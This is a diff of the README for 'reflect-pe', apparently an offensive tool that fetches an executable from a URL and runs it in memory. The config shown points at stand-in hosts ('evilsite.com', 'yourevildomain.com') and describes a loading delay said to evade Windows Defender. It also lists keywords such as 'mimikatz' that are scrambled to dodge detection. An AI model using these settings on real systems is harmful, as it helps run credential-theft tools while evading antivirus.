@@ -27,24 +27,18 @@ reflect-pe.exe http://www.evilsite.com/config.yml
 ## Config
 ```
 # BinaryPath can either be an HTTP url, a relative path or an absolute path.
-
 BinaryPath: 'http://www.yourevildomain.com/file.exe'
 
 # ReflectArgs is a string containing the arguments passed to your binary when executed in memory.
-
 # For Unmanaged PE: First argument is the program's name. This parameter can be empty
-
 # For managed PE: First argument is the real first argument
 
 ReflectArgs: 'arg0 arg1 arg2'
 
 # 3 options to load an unmanaged executable in memory:
 # Wait: will call CreateThread, then wait 15 to 30 seconds before resuming the threat. This proved very effective against Windows Defender.
-
 # <empty>: We do not wait between thread creation and execution
-
 # Function: We overwrite the address of a Go method with the executable's entry point
-
 
 ReflectMethod:  # wait, function or empty
 
@@ -56,7 +50,6 @@ CLRRuntime: v4
 LogLevel: 2
 
 # Keywords to be replaced by a random shuffle. Both utf8 and unicode versions are replaced.
-
 Keywords:
   - mimikatz
   - delpy
@@ -69,12 +62,12 @@ Ps: config_mimi.yml contains the basic keywords to target to run a mimikatz with
 Reflect-pe only works for x64 dynamic executables on 64-bit intel machines.  
 
 It's not stable when it comes to static binary for the good reason that hardcoded absolute addresses are difficult to find and translate to the new relocated address.
-So it cannot load a go-binary for instance (among other reasons)  
+So it cannot load a go-binary for instance (also because the go runtime cannot be loaded twice inside the same process)
 
-I still did not try loading a DLL. There may be some small work to do to make it fully work.  
+I did not try loading a DLL. There may be some small adjustments that are needed to make it work.
 
 
 ## Credit
 * https://github.com/stephenfewer/ReflectiveDLLInjection  
 * https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
-* https://github.com/ropnop/go-clr
+* Huge thanks to https://github.com/ropnop/go-clr for 90% of the CLR loading in Go
